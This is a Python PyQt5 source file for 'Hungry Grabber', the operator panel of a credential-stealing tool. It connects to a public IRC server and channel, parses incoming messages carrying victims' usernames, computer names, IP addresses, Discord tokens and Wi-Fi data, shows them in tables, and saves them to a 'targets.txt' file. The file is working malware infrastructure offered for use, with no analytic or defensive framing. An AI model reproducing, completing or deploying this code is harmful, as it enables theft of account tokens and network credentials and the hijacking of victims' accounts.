# -*- coding: utf-8 -*-
import socket, threading
import time, string, queue
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import *


class Show_menu(object):

    def __init__(self, Form):
        Form.setObjectName("Hungry Grabber")
        Form.resize(930, 670)
        self.tableWidget = QtWidgets.QTableWidget(Form)

        self.tableWidget.setGeometry(QtCore.QRect(10, 120, 911, 320))
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(4)
        self.tableWidget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        QtCore.QMetaObject.connectSlotsByName(Form)
        #self.retranslateUi(Form)

        self.tablewifi = QtWidgets.QTableWidget(Form)

        self.tablewifi.setGeometry(QtCore.QRect(10, 438, 911, 220))
        self.tablewifi.setObjectName("tableWidget")
        self.tablewifi.setColumnCount(1)
        self.tablewifi.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tablewifi.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()

        #def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Hungry Grabber"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("Form", "Username"))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("Form", "Computername"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("Form", "Ip"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("Form", "Discord Token"))
        item = self.tablewifi.horizontalHeaderItem(0)
        item.setText(_translate("Form", "Wifi"))
        self.tablewifi.horizontalHeader().setStyleSheet('color: black')
        self.tableWidget.horizontalHeader().setStyleSheet('color: black')


        #self.tableWidget.horizontalHeader().setStyleSheet('color: #EDFEFF')
        self.tableWidget.setStyleSheet('color: black')
        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.tableWidget.show()
        self.tablewifi.setStyleSheet('color: black')
        self.tablewifi.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.tablewifi.show()

        self.info_to_save = ''
        self.loop_saved = 0
        self.already_co = False

    def save_folder(self):
        if len(self.info_to_save) != 0:
            splited_info = self.info_to_save.split("(^^'c)")
            with open("targets.txt", 'w') as saved:
                del splited_info[-1:]
                for parse_ele in splited_info:
                    self.loop_saved+=1
                    saved.write(f"-----------------{self.loop_saved}------------------\n")
                    parse_ele = parse_ele.split()
                    for parsed in parse_ele:
                        saved.write(f"{parsed}\n")
                    saved.write(f"------------------------------------\n")
            self.loop_saved = 0

            msg_save = QMessageBox()
            msg_save.setIcon(QMessageBox.Information)
            msg_save.setText("successfully saved !")
            msg_save.setWindowTitle("success")
            msg_save.exec_()
        else:
            msg_not = QMessageBox()
            msg_not.setIcon(QMessageBox.Warning)
            msg_not.setText("Nothing to save")
            msg_not.setWindowTitle("error")
            msg_not.exec_()


    def connect(self, Form, irc_user):
        if self.already_co:
            already = QMessageBox()
            already.setIcon(QMessageBox.Critical)
            already.setText("You are already connected !")
            already.setWindowTitle("error")
            already.exec_()
            return
        else:
            self.already_co = True

        self.info_co = QtWidgets.QLabel(Form)
        self.info_co.setText("Connected ! Waiting for info...")
        self.info_co.setFont(QtGui.QFont("Funkturm", 12))
        self.info_co.setStyleSheet('color: #204B4E')
        self.info_co.setGeometry(210, 28, 320, 50)
        self.info_co.show()

        # Connect to the irc
        self.irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server = 'irc.epiknet.org'
        self.port = 6667
        self.channel = '#Informatique'
        self.nickname = irc_user + 'x4hs'
        self.botpass = 'x4hs' + irc_user
        self.loop_hit = 0
        irc = socket.socket()
        try:
            self.irc.connect((self.server, self.port))
        except socket.gaierror as i:
            msg_error = QMessageBox()
            msg_error.setIcon(QMessageBox.Critical)
            msg_error.setText("you are not connected! restart the program when it's ok")
            msg_error.setWindowTitle("Connection error")
            msg_error.exec_()
            exit()

        # user auth
        self.irc.send(bytes("NICK " + self.nickname + "\n", "UTF-8"))

        while 1 :
            try :
                resp = self.irc.recv (4096 ).decode("UTF-8")
            except ConnectionAbortedError:
                msg_error = QMessageBox()
                msg_error.setIcon(QMessageBox.Critical)
                msg_error.setText("your session username has been warned, this may be due to too many login requests. You have to wait or change session username or take a vpn...")
                msg_error.setWindowTitle("Connection error")
                msg_error.exec_()
                exit()

            if resp [0:4]=="PING":
                print(resp)
                self.irc.send (bytes ("PONG "+resp.split()[1]+"\r\n","UTF-8"))
                print("PONG " + resp.split() [ 1 ])
                break

        self.irc.send(bytes("USER " + self.nickname + " " + self.nickname + " " + self.nickname + ":python IRC\r\n", "UTF-8"))
        self.irc.send(bytes("NICKSERV IDENTIFY " + self.botpass + " " + self.botpass + "\n", "UTF-8"))
        time.sleep(2)
        self.irc.send(bytes("JOIN " + self.channel + "\n", "UTF-8"))
        time.sleep(1)
        # Get the response
        q = queue.Queue()
        thread = threading.Thread(target=self.thr_launch, args=(Form, q,))
        thread.start()

    def thr_launch(self, Form, q):

        while 1:
            resp = self.irc.recv(7000).decode("UTF-8")

            if resp [0:4]=="PING":
                print(resp)
                self.irc.send (bytes ("PONG "+resp.split()[1]+"\r\n","UTF-8"))
                print("PONG " + resp.split() [ 1 ])

            if "zb_xs" in resp:

                final_info = resp.split("zb_xs")

                name_ = final_info[0]
                desk_ = final_info[1]
                ip_ = final_info[2]
                token_ = final_info[3]
                wifi_ = final_info[4]

                name_ = name_.split(':')[2]
                wifi_ = wifi_.split(':')[0]

                self.add_info(Form, name_, desk_, ip_, token_, wifi_)

            else:
                pass

    def exit_(self):
        try:
            self.irc.close()
            exit()
        except :
            exit()
            pass

    def add_info(self, Form, name_, desk_, ip_, token_, wifi_):
        column = self.loop_hit + 1

        self.tableWidget.setRowCount(column)
        self.tablewifi.setRowCount(column)

        self.tableWidget.setItem(self.loop_hit,0, QTableWidgetItem(name_))
        self.tableWidget.item(self.loop_hit, 0).setBackground(QtGui.QColor('#EDFEFF'))

        self.tableWidget.setItem(self.loop_hit,1, QTableWidgetItem(desk_))
        self.tableWidget.item(self.loop_hit, 1).setBackground(QtGui.QColor('#EDFEFF'))

        self.tableWidget.setItem(self.loop_hit,2, QTableWidgetItem(ip_))
        self.tableWidget.item(self.loop_hit, 2).setBackground(QtGui.QColor('#EDFEFF'))

        self.tableWidget.setItem(self.loop_hit,3, QTableWidgetItem(token_))
        self.tableWidget.item(self.loop_hit, 3).setBackground(QtGui.QColor("#EDFEFF"))

        self.tablewifi.setItem(self.loop_hit,0, QTableWidgetItem(wifi_))
        self.tablewifi.item(self.loop_hit, 0).setBackground(QtGui.QColor("#EDFEFF"))

        if token_ == "No token found":
            self.info_to_save += f"{name_} {desk_} {ip_} {wifi_}(^^'c)"
        else:
            self.info_to_save+= f"{name_} {desk_} {ip_} {token_} {wifi_}(^^'c)"

        self.loop_hit+=1
